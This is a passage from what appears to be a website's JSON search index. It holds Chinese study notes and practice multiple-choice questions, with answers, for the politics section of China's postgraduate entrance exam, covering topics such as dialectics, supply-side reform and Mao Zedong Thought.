\uff0c\u5c31\u8981\u5c06\u751f\u4ea7\u7684\u5546\u54c1\u4ea4\u6362\u51fa\u53bb\u3002 4.8. \u515a\u6210\u7acb\u7684\u4f1f\u5927\u610f\u4e49 # \u4e2d\u56fd\u7684\u9769\u547d\u9762\u8c8c\u7115\u7136\u4e00\u65b0\uff1a \u2460 \u6709\u4e86\u65b0\u7684\u594b\u6597\u76ee\u6807 \u2461 \u6709\u4e86\u65b0\u7684\u9886\u5bfc\u529b\u91cf \u2462 \u6709\u4e86\u65b0\u7684\u9769\u547d\u65b9\u6cd5 \u2463 \u6709\u4e86\u65b0\u7684\u6307\u5bfc\u601d\u60f3","title":"1.\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e00\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#_1","text":"","title":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e00\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#_2","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e00\u5b63 \u76ee\u5f55 1. \u7b2c\u4e00\u5468 1.1. \u7231\u56fd\u4e3b\u4e49\u7684\u57fa\u672c\u5185\u6db5 1.2. \u4e2d\u56fd\u5171\u4ea7\u515a\u514b\u654c\u5236\u80dc\u7684\u4e09\u5927\u6cd5\u5b9d 1.3. \u6587\u5316\u5f3a\u56fd 1.4. \u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a 1.5. \u8fa9\u8bc1\u6cd5\u7684\u4e24\u5927\u7279\u5f81 1.6. \u5168\u9762\u6df1\u5316\u6539\u9769\u7684\u603b\u76ee\u6807 1.7. \u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3 2. \u7b2c\u4e8c\u5468 2.1. \u4f9b\u7ed9\u4fa7\u7ed3\u6784\u6027\u6539\u9769 2.2. \u5546\u54c1\u7684\u542b\u4e49 2.3. \u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42 2.4. \u79d1\u5b66\u9ad8\u5c1a\u7684\u4eba\u751f\u89c2 2.5. \u5f62\u800c\u4e0a\u5b66 2.6. \u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316 2.7. \u4e94\u5927\u53d1\u5c55\u7406\u5ff5 3. \u7b2c\u4e09\u5468 3.1. \u4f9d\u6cd5\u6cbb\u56fd\u3001\u4ee5\u5fb7\u6cbb\u56fd 3.2. \u552f\u7269\u4e3b\u4e49\u548c\u552f\u5fc3\u4e3b\u4e49 3.3. \u8fd1\u4ee3\u4e2d\u56fd\u7684\u4e3b\u8981\u77db\u76fe\u548c\u4e3b\u8981\u4efb\u52a1 3.4. \u5b9e\u8df5\u548c\u8ba4\u8bc6\u7684\u5173\u7cfb 3.5. \u804c\u4e1a\u9053\u5fb7\u548c\u516c\u5171\u9053\u5fb7 3.6. \u4e2d\u56fd\u7cbe\u795e 3.7. \u8f9b\u4ea5\u9769\u547d 3.8. \u793e\u4f1a\u5b58\u5728\u548c\u793e\u4f1a\u610f\u8bc6 4. \u7b2c\u56db\u5468 4.1. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u793e\u4f1a\u7684\u9636\u7ea7\u6784\u6210 4.2. \u4e24\u4e2a\u4e00\u767e\u5e74\u548c\u4e24\u6b65\u8d70 4.3. \u5b9e\u8df5\u7684\u6982\u5ff5\u548c\u57fa\u672c\u7ed3\u6784 4.4. \u5b9e\u8df5\u7684\u57fa\u672c\u7c7b\u578b 4.5. \u5b9e\u8df5\u7684\u57fa\u672c\u7279\u5f81 4.6. \u771f\u7406\u4e0e\u4ef7\u503c 4.7. \u5546\u54c1\u7ecf\u6d4e\u7684\u57fa\u672c\u77db\u76fe 4.8. \u515a\u6210\u7acb\u7684\u4f1f\u5927\u610f\u4e49","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#1","text":"","title":"1. \u7b2c\u4e00\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#11","text":"\u2460 \u70ed\u7231\u7956\u56fd\u7684\u5927\u597d\u6cb3\u5c71 \u2461 \u70ed\u7231\u7956\u56fd\u7684\u9aa8\u8089\u540c\u80de \u2462 \u70ed\u7231\u7956\u56fd\u7684\u707f\u70c2\u6587\u5316 \u2463 \u70ed\u7231\u81ea\u5df1\u7684\u56fd\u5bb6 \u94fe\u63a5\u70ed\u70b9\uff1a\u75ab\u60c5\u9632\u63a7","title":"1.1. \u7231\u56fd\u4e3b\u4e49\u7684\u57fa\u672c\u5185\u6db5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#12","text":"\u2460 \u7edf\u4e00\u6218\u7ebf \uff08\u6218\uff09 \u2461 \u6b66\u88c5\u6597\u4e89 \uff08\u6597\uff09 \u2462 \u515a\u7684\u5efa\u8bbe \uff08\u515a\uff09","title":"1.2. \u4e2d\u56fd\u5171\u4ea7\u515a\u514b\u654c\u5236\u80dc\u7684\u4e09\u5927\u6cd5\u5b9d"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#13","text":"\u6211\u4eec\u5f97\u4ece\u4e24\u4e2a\u65b9\u9762\u6765\u5efa\u8bbe\uff0c\u4e00\u4e2a\u53eb\u6587\u5316\u4e8b\u4e1a\uff0c\u4e00\u4e2a\u53eb\u6587\u5316\u4ea7\u4e1a\u3002 \u6587\u5316\u4e8b\u4e1a\uff1a\uff08\u56fe\u4e66\u9986\uff09 \u4e3b\u8981\u4ee5\u653f\u5e9c\u4e3b\u5bfc\uff0c\u8981\u6ce8\u91cd\u516c\u76ca\u6027\u3001\u57fa\u672c\u6027\u3001\u5747\u7b49\u6027\u3001\u4fbf\u5229\u6027\uff0c\u53e6\u5916\u8fd8\u8981\u6ee1\u8db3\u4eba\u6c11\u57fa\u672c\u6587\u5316\u751f\u6d3b\u9700\u8981\u3002 \u6587\u5316\u4ea7\u4e1a\uff1a\uff08\u7535\u5f71\u9662\uff09 \u4e3b\u8981\u4ee5\u5e02\u573a\u4e3a\u4e3b\u5bfc\uff0c\u672a\u6765\u8981\u6210\u4e3a\u6211\u56fd\u7684\u7ecf\u6d4e\u652f\u67f1\uff0c\u6ee1\u8db3\u4eba\u4eec\u66f4\u9ad8\u5c42\u6b21\uff0c\u66f4\u591a\u7684\u6587\u5316\u751f\u6d3b\u9700\u8981\u3002","title":"1.3. \u6587\u5316\u5f3a\u56fd"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#14","text":"\"\u5c0f\u5eb7\"\u8bb2\u7684\u662f\u53d1\u5c55\u6c34\u5e73 \"\u5168\u9762\"\u8bb2\u7684\u662f\u53d1\u5c55\u7684\u5e73\u8861\u6027\u3001\u534f\u8c03\u6027\u3001\u53ef\u6301\u7eed\u6027 \u5168\u9762\u5efa\u8bbe\u5c0f\u5eb7\u793e\u4f1a\uff0c\u66f4\u91cd\u8981\uff0c\u66f4\u96be\u505a\u5230\u7684\u662f\"\u5168\u9762\"\u3002\u5982\u671f\u5168\u9762\u5efa\u8bbe\u5c0f\u5eb7\u793e\u4f1a\uff0c\u65e2\u575a\u6301\u4e00\u5b9a\u6807\u51c6\uff0c\u53c8\u9632\u6b62\u597d\u9ad8\u9a9b\u8fdc\uff0c\u65e2\u8003\u8651\u52302020\u5e74\u8fd9\u4e2a\u65f6\u95f4\u8282\u70b9 \uff0c\u53c8\u7acb\u8db3\u4e8e\u6253\u57fa\u7840\u3001\u8c0b\u957f\u8fdc\u3001\u89c1\u6210\u6548\u3002","title":"1.4. \u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#15","text":"\u8054\u7cfb\u4e0e\u53d1\u5c55 \u8054\u7cfb\u5177\u6709\u56db\u5927\u7279\u70b9\uff1a \u5ba2\u89c2\u6027\u3001\u666e\u904d\u6027\u3001\u591a\u6837\u6027\u3001\u6761\u4ef6\u6027 \u53d1\u5c55\uff1a \u957f\u6c5f\u540e\u6d6a\u63a8\u524d\u6d6a\uff0c\u4e00\u6d6a\u8981\u6bd4\u4e00\u6d6a\u6d6a \u957f\u6c5f\u540e\u6d6a\u63a8\u524d\u6d6a\uff0c\u524d\u6d6a\u4e00\u5b9a\u4f1a\u6b7b\u5728\u6c99\u6ee9\u4e0a \u8fd9\u4e2a\u4e16\u754c\u4e0d\u662f\u65e2\u6210\u4e8b\u7269\u7684\u96c6\u5408\u4f53\uff0c\u800c\u662f\u8fc7\u7a0b\u7684\u96c6\u5408\u4f53 \u3010\u591a\u9009\u30112017\u5e746\u6708\uff0c\u6211\u56fd\u79d1\u5b66\u5bb6\u5229\u7528\u201c\u58a8\u5b50\u53f7\u201d\u91cf\u5b50\u79d1\u5b66\u5b9e\u9a8c\u536b\u661f\u5728\u56fd\u9645\u4e0a\u7387\u5148\u6210\u529f\u5b9e\u73b0\u4e86\u5343\u516c\u91cc\u7ea7\u7684\u661f\u5730\u53cc\u5411\u91cf\u5b50\u7ea0\u7f20\u5206\u53d1\u3002\u201c\u91cf\u5b50\u7ea0\u7f20\u201d\u5c31\u662f\u4e24\u4e2a\uff08\u6216\u591a\u4e2a\uff09\u7c92\u5b50\u5171\u540c\u7ec4\u6210\u7684\u91cf\u5b50\u72b6\u6001\uff0c\u65e0\u8bba\u7c92\u5b50\u4e4b\u95f4\u76f8\u9694\u591a\u8fdc\uff0c\u6d4b\u91cf\u5176\u4e2d\u4e00\u4e2a\u7c92\u5b50\u5fc5\u7136\u4f1a\u5f71\u54cd\u5176\u4ed6\u7c92\u5b50\u3002\u201c\u91cf\u5b50\u7ea0\u7f20\u201d\u73b0\u8c61\u867d\u7136\u672a\u88ab\u5b8c\u5168\u8ba4\u77e5\uff0c\u4f46\u5b83\u4ecd\u7136\u80fd\u591f\u8bf4\u660e \uff21\uff0e\u4e16\u754c\u7684\u771f\u6b63\u7edf\u4e00\u6027\u5728\u4e8e\u5b83\u7684\u7269\u8d28\u6027 \uff22\uff0e\u4e8b\u7269\u8054\u7cfb\u7684\u4e3b\u89c2\u6027\u548c\u5076\u7136\u6027 \uff23\uff0e\u4e8b\u7269\u8054\u7cfb\u7684\u590d\u6742\u6027\u548c\u591a\u6837\u6027 \uff24\uff0e\u7269\u8d28\u4e16\u754c\u8054\u7cfb\u7684\u5ba2\u89c2\u6027\u548c\u666e\u904d\u6027 \u7b54\u6848 $$ACD$$ \u3010\u591a\u9009\u3011\u201c\u6c89\u821f\u4fa7\u7554\u5343\u5e06\u8fc7\uff0c\u75c5\u6811\u524d\u5934\u4e07\u6728\u6625\u3002\u201c\u8fa9\u8bc1\u6cd5\u8ba4\u4e3a\u53d1\u5c55\u7684\u5b9e\u8d28\u662f\u65b0\u4e8b\u7269\u7684\u4ea7\u751f\u548c\u65e7\u4e8b\u7269\u7684\u706d\u4ea1\u3002\u65b0\u751f\u4e8b\u7269\u5fc5\u7136\u53d6\u4ee3\u65e7\u4e8b\u7269\uff0c\u4ece\u6839\u672c\u4e0a\u8bf4\uff0c\u662f\u56e0\u4e3a \uff21\uff0e\u65b0\u751f\u4e8b\u7269\u4ea7\u751f\u4e8e\u65e7\u4e8b\u7269\u4e4b\u540e\uff0c\u662f\u65b0\u51fa\u73b0\u7684\u4e8b\u7269 \uff22\uff0e\u65b0\u751f\u4e8b\u7269\u5177\u6709\u65b0\u7684\u7ed3\u6784\u548c\u529f\u80fd\uff0c\u80fd\u9002\u5e94\u5df2\u7ecf\u53d8\u5316\u4e86\u7684\u73af\u5883\u548c\u6761\u4ef6 \uff23\uff0e\u65b0\u751f\u4e8b\u7269\u662f\u5bf9\u65e7\u4e8b\u7269\u7684\u626c\u5f03\uff0c\u5e76\u6dfb\u52a0\u4e86\u65e7\u4e8b\u7269\u6240\u4e0d\u80fd\u5bb9\u7eb3\u7684\u65b0\u5185\u5bb9 \uff24\uff0e\u5728\u793e\u4f1a\u5386\u53f2\u9886\u57df\u5185\uff0c\u65b0\u751f\u4e8b\u7269\u7b26\u5408\u5e7f\u5927\u4eba\u6c11\u7fa4\u4f17\u7684\u6839\u672c\u5229\u76ca\u548c\u8981\u6c42 \u7b54\u6848 $$BCD$$","title":"1.5. \u8fa9\u8bc1\u6cd5\u7684\u4e24\u5927\u7279\u5f81"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#16","text":"\u2460\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u5236\u5ea6 \u2461\u63a8\u8fdb\u56fd\u5bb6\u6cbb\u7406\u4f53\u7cfb\u3001\u6cbb\u7406\u80fd\u529b\u7684\u73b0\u4ee3\u5316","title":"1.6. \u5168\u9762\u6df1\u5316\u6539\u9769\u7684\u603b\u76ee\u6807"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#17","text":"\u6838\u5fc3\u662f\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u9700\u8981\u8003\u8651\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a \u601d\u60f3\u5c42\u9762\uff1a\u6211\u4eec\u8981\u575a\u6301\u53d1\u5c55\u4ec0\u4e48\u6837\u7684\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\uff1b \u884c\u52a8\u5c42\u9762\uff1a\u6211\u4eec\u8981\u600e\u6837\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u3002 \u3010\u5355\u9009\u3011\u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3\u662f\u5bf9\u9a6c\u514b\u601d\u5217\u5b81\u4e3b\u4e49\u3001\u6bdb\u6cfd\u4e1c\u601d\u60f3\u3001\u9093\u5c0f\u5e73\u7406\u8bba\u3001\u201c\u4e09\u4e2a\u4ee3\u8868\u201d\u91cd\u8981\u601d\u60f3\u3001\u79d1\u5b66\u53d1\u5c55\u89c2\u7684\u7ee7\u627f\u548c\u53d1\u5c55\uff0c\u662f\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u6700\u65b0\u6210\u679c\uff0c\u662f\u515a\u548c\u4eba\u6c11\u5b9e\u8df5\u7ecf\u9a8c\u548c\u96c6\u4f53\u667a\u6167\u7684\u7ed3\u6676\uff0c\u662f\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u662f\u5168\u515a\u5168\u56fd\u4eba\u6c11\u4e3a\u5b9e\u73b0\u4e2d\u534e\u6c11\u65cf\u4f1f\u5927\u590d\u5174\u800c\u594b\u6597\u7684\u884c\u52a8\u6307\u5357\u3002\u8fd9\u4e00\u601d\u60f3\u7684\u6838\u5fc3\u8981\u4e49\u662f A\uff0e\u63a8\u8fdb\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u65f6\u4ee3\u5316\u5927\u4f17\u5316 B\uff0e\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 C\uff0e\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49 D\uff0e\u575a\u6301\u4ee5\u7ecf\u6d4e\u5efa\u8bbe\u4e3a\u4e2d\u5fc3 \u7b54\u6848 $$C$$ \u6613\u9519\u9009D","title":"1.7. \u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#2","text":"","title":"2. \u7b2c\u4e8c\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#21","text":"\u4f9b\u7ed9\u4fa7\u4e0e\u9700\u6c42\u4fa7\u662f\u4e00\u7ec4\u77db\u76fe\u3002 \u4f9b\u7ed9\u4fa7\u7684\u6839\u672c\u76ee\u7684\u662f\u4e3a\u4e86\u6ee1\u8db3\u4eba\u6c11\u7684\u9700\u8981\u3002 \u6211\u4eec\u8981\u53d1\u5c55\u5b9e\u4f53\u7ecf\u6d4e\uff1b\u8981\u4ece\u4ee5\u4ef7\u53d6\u80dc\u8f6c\u53d8\u4e3a\u4ee5\u8d28\u53d6\u80dc\uff1b\u8981\u52a0\u5927\u4eba\u624d\u7684\u57f9\u80b2\u529b\u5ea6\uff1b\u8981\u505a\u5230\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u3002 \u3010\u5355\u9009\u3011\u5728\u5f53\u524d\u548c\u4eca\u540e\u4e00\u4e2a\u65f6\u671f\uff0c\u6211\u56fd\u7ecf\u6d4e\u53d1\u5c55\u9762\u4e34\u7684\u95ee\u9898\uff0c\u4f9b\u7ed9\u548c\u9700\u6c42\u4e24\u4fa7\u90fd\u6709\uff0c\u4f46\u77db\u76fe\u7684\u4e3b\u8981\u65b9\u9762\u5728 A.\u4f9b\u7ed9\u4fa7 B.\u9700\u6c42\u4fa7 C.\u4eba\u6c11\u65e5\u76ca\u589e\u957f\u7684\u7f8e\u597d\u751f\u6d3b\u7684\u9700\u8981 D.\u4e0d\u5e73\u8861\u4e0d\u5145\u5206\u7684\u53d1\u5c55 \u7b54\u6848 $$ A $$ \u6613\u9519\u9009\uff1aD \u3010\u5355\u9009\u3011\u6301\u7eed\u63a8\u8fdb\u201c\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u201d\uff0c\u4f18\u5316\u5e02\u573a\u4f9b\u6c42\u7ed3\u6784\uff0c\u90a3\u4e48\u201c\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u201d\u7684\u5185\u5bb9\u662f A.\u53bb\u77ed\u677f\u3001\u53bb\u7a0e\u8d39\u3001\u53bb\u6760\u6746\u3001\u964d\u5e93\u5b58\u3001\u8865\u4ea7\u80fd B.\u53bb\u4ea7\u80fd\u3001\u53bb\u7a0e\u8d39\u3001\u53bb\u6760\u6746\u3001\u964d\u5e93\u5b58\u3001\u8865\u77ed\u677f C.\u53bb\u4ea7\u80fd\u3001\u53bb\u5e93\u5b58\u3001\u53bb\u6760\u6746\u3001\u964d\u6210\u672c\u3001\u8865\u77ed\u677f D.\u53bb\u4ea7\u80fd\u3001\u53bb\u5e93\u5b58\u3001\u53bb\u77ed\u677f\u3001\u964d\u6210\u672c\u3001\u8865\u6760\u6746 \u7b54\u6848 $$ C $$","title":"2.1. \u4f9b\u7ed9\u4fa7\u7ed3\u6784\u6027\u6539\u9769"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#22","text":"\u2460 \u5b83\u662f\u4ee5\u4ea4\u6362\u4e3a\u76ee\u7684\u7684 \u2461 \u5b83\u5fc5\u987b\u662f\u52b3\u52a8\u4ea7\u54c1","title":"2.2. \u5546\u54c1\u7684\u542b\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#23","text":"\u2460 \u662f\uff08\u5b9e\u4e8b\u6c42\u662f\uff09 \u2461 \u7fa4\uff08\u7fa4\u4f17\u8def\u7ebf\uff09 \u2462 \u4e3b\uff08\u72ec\u7acb\u81ea\u4e3b\uff09 \u533a\u5206 \uff1a \u548c\u515a\u7684\u4e09\u5927\u6cd5\u5b9d\uff1a\u6218\u6597\u515a\uff08\u7edf\u4e00\u6218\u7ebf\uff0c\u6b66\u88c5\u6597\u4e89\uff0c\u515a\u7684\u5efa\u8bbe\uff09 \u515a\u4e09\u5927\u4f18\u826f\u4f5c\u98ce\uff1a\u5bc6\u5207\u8054\u7cfb\u7fa4\u4f17\uff0c\u7406\u8bba\u8054\u7cfb\u5b9e\u9645\uff0c\u6279\u8bc4\u4e0e\u81ea\u6211\u6279\u8bc4 \u3010\u591a\u9009\u3011\u4e2d\u5171\u4e2d\u592e\u300a\u5173\u4e8e\u5efa\u56fd\u4ee5\u6765\u515a\u7684\u82e5\u5e72\u5386\u53f2\u95ee\u9898\u7684\u51b3\u8bae\u300b\u6982\u62ec\u7684\u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42\u6709 A.\u515a\u7684\u5efa\u8bbe B.\u5b9e\u4e8b\u6c42\u662f C.\u7fa4\u4f17\u8def\u7ebf D.\u6b66\u88c5\u6597\u4e89 E.\u72ec\u7acb\u81ea\u4e3b \u7b54\u6848 $$ BCE $$","title":"2.3. \u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#24","text":"\u2460 \u4eba\u751f\u76ee\u7684 \u2461 \u4eba\u751f\u6001\u5ea6 \u2462 \u4eba\u751f\u4ef7\u503c \u3010\u5355\u9009\u3011\u4eba\u751f\u89c2\u662f\u4eba\u4eec\u5728\u5b9e\u8df5\u4e2d\u5f62\u6210\u7684\u5bf9\u4eba\u751f\u7684\u76ee\u7684\u548c\u610f\u4e49\u7684\u6839\u672c\u770b\u6cd5\uff0c\u5b83\u51b3\u5b9a\u7740\u4eba\u4eec\u5b9e\u8df5\u6d3b\u52a8\u7684\u76ee\u6807\uff0c\u4eba\u751f\u9053\u8def\u7684\u65b9\u5411\u548c\u5bf9\u5f85\u751f\u6d3b\u7684\u6001\u5ea6\u662f\u4e16\u754c\u89c2\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u4eba\u751f\u89c2\u7684\u6838\u5fc3\u662f A.\u4eba\u751f\u76ee\u7684 B.\u4eba\u751f\u6001\u5ea6 C.\u4eba\u751f\u4ef7\u503c D.\u4eba\u751f\u7ecf\u5386 \u7b54\u6848 $$ A $$ \u3010\u591a\u9009\u3011\u6bd4\u8f83\u5ba2\u89c2\u516c\u6b63\u51c6\u786e\u5730\u8bc4\u4ef7\u793e\u4f1a\u6210\u5458\u4eba\u751f\u4ef7\u503c\u7684\u5927\u5c0f\uff0c\u9664\u4e86\u8981\u638c\u63e1\u79d1\u5b66\u7684\u6807\u51c6\u5916\uff0c\u8fd8\u9700\u8981\u638c\u63e1\u6070\u5f53\u7684\u8bc4\u4ef7\u65b9\u6cd5\uff0c\u575a\u6301 A.\u80fd\u529b\u6709\u5927\u5c0f\u4e0e\u8d21\u732e\u987b\u5c3d\u529b\u76f8\u7edf\u4e00 B.\u7269\u8d28\u8d21\u732e\u4e0e\u7cbe\u795e\u8d21\u732e\u76f8\u7edf\u4e00 C.\u5b8c\u5584\u81ea\u8eab\u4e0e\u8d21\u732e\u793e\u4f1a\u76f8\u7edf\u4e00 D.\u5730\u4f4d\u4e0e\u5f71\u54cd\u76f8\u7edf\u4e00 \u7b54\u6848 $$ ABC $$","title":"2.4. \u79d1\u5b66\u9ad8\u5c1a\u7684\u4eba\u751f\u89c2"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#25","text":"\u53cd\u4e49\u8bcd\u662f\u8fa9\u8bc1\u6cd5\u3002 \u7279\u70b9\u662f\u5b64\u7acb\u7684\u3001\u9759\u6b62\u7684\u3001\u5426\u8ba4\u77db\u76fe\u7684\u3002","title":"2.5. \u5f62\u800c\u4e0a\u5b66"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#26","text":"\u5c31\u662f\u5c06\u9a6c\u514b\u601d\u4e3b\u4e49\u548c\u4e2d\u56fd\u5b9e\u9645\u76f8\u7ed3\u5408\u3002 \u4e3a\u4ec0\u4e48\u8981\u5c06\u4ed6\u4eec\u76f8\u7ed3\u5408\uff1a \u2460 \u56e0\u4e3a\u9a6c\u514b\u601d\u9700\u8981 \u2461 \u56e0\u4e3a\u4e2d\u56fd\u9700\u8981 \u2462 